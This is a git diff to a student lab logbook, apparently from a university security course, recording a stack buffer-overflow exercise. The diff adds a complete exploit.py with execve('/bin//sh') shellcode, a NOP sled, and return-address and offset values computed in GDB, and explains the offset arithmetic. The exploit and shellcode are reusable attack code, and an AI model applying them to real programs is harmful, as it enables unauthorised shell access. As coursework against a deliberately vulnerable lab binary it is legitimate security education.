@@ -54,27 +54,61 @@ And ran ```make stack-L1``` successfully.
 
 To exploit the buffer-overflow vulnerability, we needed to know the distance between the buffer's start and the return address. Using GDB, we set a breakpoint in the vulnerable function and checked the base pointer (EBP) and buffer address. This allowed us to calculate the offsets needed to create a payload that overwrites the return address, letting our shellcode execute.
 
-After following the commands provided in the guide, we obtained the following output:
+After executing the commands provided in the guide, we obtained the following output:
 
 ![Image 1.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task3_LOGBOOK5_1.png)
 
-*Image 4*
 
 
-Next, we changed the file ```exploit.py```:
-![Image 1.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task3_LOGBOOK5_2.png)
+Next, we modified the file ```exploit.py``` as follows:
 
-*Image 5 - Exploit updated file*
+```
+#!/usr/bin/python3
+import sys
 
-Explanation of the changes: 
-In the start, we placed the shellcode at the end of the buffer, ensuring enough space for the entire payload:
+# Replace the content with the actual shellcode
+shellcode= (
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+    "\xd2\x31\xc0\xb0\x0b\xcd\x80" 
+).encode('latin-1')
+
+# Fill the content with NOP's
+content = bytearray(0x90 for i in range(517)) 
+
+##################################################################
+# Put the shellcode somewhere in the payload
+start = 517 - len(shellcode) - 1                # Change this number 
+content[start:start + len(shellcode)] = shellcode
+
+# Decide the return address value 
+# and put it somewhere in the payload
+ret    = 0xffffca0c + start           # Change this number 
+offset = 0xffffcaa8 + 4 - 0xffffca0c   # Change this number 
+
+L = 4     # Use 4 for 32-bit address and 8 for 64-bit address
+content[offset:offset + L] = (ret).to_bytes(L,byteorder='little') 
+##################################################################
+
+# Write the content to a file
+with open('badfile', 'wb') as f:
+  f.write(content)
+```
+
+
+
+Explanation of the modifications: 
+
 > start = (517 - len(shellcode) - 1)
+Here, we placed the shellcode at the end of the buffer, to ensure there is enough space for the entire payload:
 
-This is the address of the buffer where the shellcode starts. It ensures that when the function returns, it jumps to our shellcode to execute it.
-> ret    = 0xffffca0c
+> ret = 0xffffca0c + start 
 
 This calculates the distance between the base pointer (0xffffcaa8) and the buffer (0xffffca0c), telling us how far we need to go in the payload to overwrite the return address:
-> offset = 0xffffcaa8 - 0xffffca0c
+> offset = 0xffffcaa8 + 4 - 0xffffca0c 
+
+Finally we obtained the expected result and the attack was successfully done:
+![Image 1.](https://git.fe.up.pt/fsi/fsi2425/logs/l05g06/-/raw/main/Images/Task3_LOGBOOK5_2.png)
 
 
 
